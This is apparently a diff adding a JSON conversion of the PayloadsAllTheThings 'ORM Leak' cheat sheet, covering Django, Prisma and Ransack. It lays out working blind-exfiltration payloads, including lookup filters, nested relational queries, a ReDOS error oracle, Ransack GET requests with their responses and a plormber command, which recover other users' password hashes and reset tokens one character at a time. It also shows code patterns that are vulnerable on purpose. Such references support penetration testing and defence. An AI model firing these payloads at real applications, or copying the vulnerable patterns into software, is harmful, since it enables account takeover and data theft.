@@ -1,0 +1,185 @@
+{
+  "category": "ORM Leak",
+  "source": "PayloadsAllTheThings/ORM Leak/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What is ORM Leak",
+      "language": "text",
+      "tags": ["methodology", "orm", "leak"],
+      "body": "ORM Leak is a leak of sensitive data (DB structure, other users' fields: passwords, hashes, reset tokens) that arises from passing user input into ORM queries insecurely.\nThe typical root of the problem: the application accepts a filter/parameters from the request and directly expands them into the ORM filter/where, giving the attacker control over the column and the comparison operator.\nEven if the field is not returned in the response, its value is exfiltrated character by character: you guess a prefix via __startswith / startsWith / *_start, and based on the reaction (results present / none) you reconstruct the value in full."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Where to look for ORM Leak",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "• Endpoints where the filter comes from the body/query and lands directly in the ORM (filter(**request.data), where: req.query.filter, q[...] in Ransack).\n• Search/listings with arbitrary filtering parameters (?filter[...], ?q[...]).\n• Parameters with double underscores (Django: field__lookup) or nested objects (Prisma: {field:{startsWith:...}}).\n• Related models: filters on relational fields (created_by__user__password) let you reach other people's records.\n• Targets for exfiltration: password / password hash, reset_password_token / resetToken, recoveries_key, any secrets in neighboring tables."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Exfiltration channels (how to reconstruct a value)",
+      "language": "text",
+      "tags": ["methodology", "blind", "exfiltration"],
+      "body": "Boolean-based  filter by prefix: results present in the response = character guessed, empty = no. You iterate over the alphabet by positions.\nTime-based     a conditional delay via a heavy regex/contains; a guessed prefix -> timeout. For blind cases with no visible difference in the response.\nError-based    a broken regex (ReDOS) crashes the query into a 500 when the condition matches - yes/no based on whether the error occurs.\nAlgorithm: you fix the known prefix, iterate over the next character from a set (e.g. hex 0123456789abcdef for tokens/hashes), repeat until the end of the string."
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Vulnerable pattern - filter(**request.data)",
+      "language": "python",
+      "tags": ["django", "python", "orm"],
+      "body": "users = User.objects.filter(**request.data)\nserializer = UserSerializer(users, many=True)"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Django - note on the vulnerability",
+      "language": "text",
+      "tags": ["django", "methodology"],
+      "body": "The problem is in how the Django ORM builds a QuerySet via keyword arguments. The unpacking operator (**) gives the user control over the names of the keyword arguments of filter() - and therefore over the column and the lookup operator."
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Query filter - filter by someone else's column",
+      "language": "json",
+      "tags": ["django", "query-filter", "exfiltration"],
+      "body": "{\n  \"username\": \"admin\",\n  \"password__startswith\": \"p\"\n}"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Useful Django lookup operators",
+      "language": "text",
+      "tags": ["django", "query-filter"],
+      "body": "The ORM provides operators for partial matching of a value: SQL LIKE, regex by a user-supplied pattern, < and > comparisons.\nInteresting filters:\n* __startswith\n* __contains\n* __regex"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Relational Filtering - types of relations",
+      "language": "text",
+      "tags": ["django", "relational", "methodology"],
+      "body": "Through relational filters you can reach the fields of related models (including other users). Example models from the writeup by Alex Brown (elttam, \"plORMbing your Django ORM\").\nTwo types of relations:\n* One-to-One\n* Many-to-Many"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Relational - One-to-One (leaking an article author's password)",
+      "language": "json",
+      "tags": ["django", "relational", "one-to-one"],
+      "body": "{\n  \"created_by__user__password__contains\": \"p\"\n}"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Relational - Many-to-Many (chain of filters)",
+      "language": "text",
+      "tags": ["django", "relational", "many-to-many"],
+      "body": "Almost the same, but you need to filter deeper.\n* Get user IDs: created_by__departments__employees__user__id\n* For each ID get the username:  created_by__departments__employees__user__username\n* Finally, leak the password hash:          created_by__departments__employees__user__password"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Relational - Many-to-Many (several filters in one query)",
+      "language": "json",
+      "tags": ["django", "relational", "many-to-many"],
+      "body": "{\n  \"created_by__departments__employees__user__username__startswith\": \"p\",\n  \"created_by__departments__employees__user__id\": 1\n}"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Error-based leaking - ReDOS (MySQL)",
+      "language": "json",
+      "tags": ["django", "error-based", "redos"],
+      "body": "{\"created_by__user__password__regex\": \"^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$\"}\n// => Return something\n\n{\"created_by__user__password__regex\": \"^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$\"}  \n// => Error 500 (Timeout exceeded in regular expression match)"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "ReDOS - note",
+      "language": "text",
+      "tags": ["django", "error-based", "redos"],
+      "body": "If Django works with MySQL, you can abuse ReDOS: when the filter does not match the condition, a heavy regex crashes the query into an error (timeout). The difference \"response present / 500\" gives a boolean oracle for character-by-character exfiltration."
+    },
+    {
+      "subcategory": "Prisma (Node.JS)",
+      "title": "Vulnerable pattern - where: req.query.filter",
+      "language": "javascript",
+      "tags": ["prisma", "nodejs", "orm"],
+      "body": "const posts = await prisma.article.findMany({\n  where: req.query.filter as any // Vulnerable to ORM Leaks\n})"
+    },
+    {
+      "subcategory": "Prisma (Node.JS)",
+      "title": "Prisma - include all fields of a related record",
+      "language": "json",
+      "tags": ["prisma", "include", "exfiltration"],
+      "body": "{\n  \"filter\": {\n    \"include\": {\n      \"createdBy\": true\n    }\n  }\n}"
+    },
+    {
+      "subcategory": "Prisma (Node.JS)",
+      "title": "Prisma - select a specific field (password)",
+      "language": "json",
+      "tags": ["prisma", "select", "exfiltration"],
+      "body": "{\n  \"filter\": {\n    \"select\": {\n      \"createdBy\": {\n        \"select\": {\n          \"password\": true\n        }\n      }\n    }\n  }\n}"
+    },
+    {
+      "subcategory": "Prisma (Node.JS)",
+      "title": "Relational - One-to-One (query-string)",
+      "language": "http",
+      "tags": ["prisma", "relational", "one-to-one"],
+      "body": "filter[createdBy][resetToken][startsWith]=06"
+    },
+    {
+      "subcategory": "Prisma (Node.JS)",
+      "title": "Relational - Many-to-Many (nested some)",
+      "language": "json",
+      "tags": ["prisma", "relational", "many-to-many"],
+      "body": "{\n  \"query\": {\n    \"createdBy\": {\n      \"departments\": {\n        \"some\": {\n          \"employees\": {\n            \"some\": {\n              \"departments\": {\n                \"some\": {\n                  \"employees\": {\n                    \"some\": {\n                      \"departments\": {\n                        \"some\": {\n                          \"employees\": {\n                            \"some\": {\n                              \"{fieldToLeak}\": {\n                                \"startsWith\": \"{testStartsWith}\"\n                              }\n                            }\n                          }\n                        }\n                      }\n                    }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}"
+    },
+    {
+      "subcategory": "Ransack (Ruby)",
+      "title": "Ransack - applicability condition",
+      "language": "text",
+      "tags": ["ransack", "ruby", "methodology"],
+      "body": "Vulnerable only in Ransack < 4.0.0.\nExfiltration goes through predicates in the q[...] parameters: *_start (starts with), *_cont (contains). Based on the presence/absence of results on the page you guess the value character by character."
+    },
+    {
+      "subcategory": "Ransack (Ruby)",
+      "title": "Ransack - extracting reset_password_token",
+      "language": "http",
+      "tags": ["ransack", "ruby", "exfiltration"],
+      "body": "GET /posts?q[user_reset_password_token_start]=0 -> Empty results page\nGET /posts?q[user_reset_password_token_start]=1 -> Empty results page\nGET /posts?q[user_reset_password_token_start]=2 -> Results in page\n\nGET /posts?q[user_reset_password_token_start]=2c -> Empty results page\nGET /posts?q[user_reset_password_token_start]=2f -> Results in page"
+    },
+    {
+      "subcategory": "Ransack (Ruby)",
+      "title": "Ransack - targeting a specific user + recoveries_key",
+      "language": "http",
+      "tags": ["ransack", "ruby", "exfiltration"],
+      "body": "GET /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0"
+    },
+    {
+      "subcategory": "Tools",
+      "title": "plormber (Prisma, time-based)",
+      "language": "text",
+      "tags": ["tools", "prisma", "time-based"],
+      "body": "elttam/plormber - a tool for exploiting time-based ORM Leak. https://github.com/elttam/plormber"
+    },
+    {
+      "subcategory": "Tools",
+      "title": "plormber - example run (prisma-contains)",
+      "language": "text",
+      "tags": ["tools", "prisma", "time-based"],
+      "body": "plormber prisma-contains \\\n    --chars '0123456789abcdef' \\\n    --base-query-json '{\"query\": {PAYLOAD}}' \\\n    --leak-query-json '{\"createdBy\": {\"resetToken\": {\"startsWith\": \"{ORM_LEAK}\"}}}' \\\n    --contains-payload-json '{\"body\": {\"contains\": \"{RANDOM_STRING}\"}}' \\\n    --verbose-stats \\\n    https://some.vuln.app/articles/time-based;"
+    },
+    {
+      "subcategory": "CVE",
+      "title": "Known CVEs with ORM Leak",
+      "language": "table",
+      "tags": ["cve", "reference"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["CVE", "Product"],
+          "rows": [
+            ["CVE-2023-47117", "Label Studio ORM Leak"],
+            ["CVE-2023-31133", "Ghost CMS ORM Leak"],
+            ["CVE-2023-30843", "Payload CMS ORM Leak"]
+          ]
+        }
+      }
+    }
+  ]
+}
